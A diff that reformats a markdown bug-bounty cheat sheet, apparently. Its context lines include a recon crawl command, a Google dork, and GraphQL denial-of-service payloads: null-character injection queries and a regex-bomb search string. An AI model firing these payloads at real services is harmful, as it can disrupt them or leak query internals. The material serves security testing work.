@@ -81,10 +81,10 @@ gospider -a -s abc.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 Google dork: /_layouts/mobile/view.aspx
 ```
 ## DOS GraphQl Endpoint
-*** Create DOS on GraphQl Endpoint by appending null characters by somehow
+***Create DOS on GraphQl Endpoint by appending null characters by somehow***
 You can reveal the bug inserting `"\u0000"` on search parameter, in order to display an error with part of the graph query.
 ** Example -1**
-```json
+```js
 query a { 
   search(q: "\u0000)", lang: "en") {
     _id
@@ -96,7 +96,7 @@ query a {
 }
 ```
 ** Example -2 
-```json
+```js
 query a { 
   search(q: "\u0000)", lang: "en") {
     _id
@@ -108,7 +108,7 @@ query a {
 }
 ```
 ### Graphql Payload with Regex Bomb
-```json
+```js
 query a { 
   search(q: "[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\", lang: "en") {
     _id
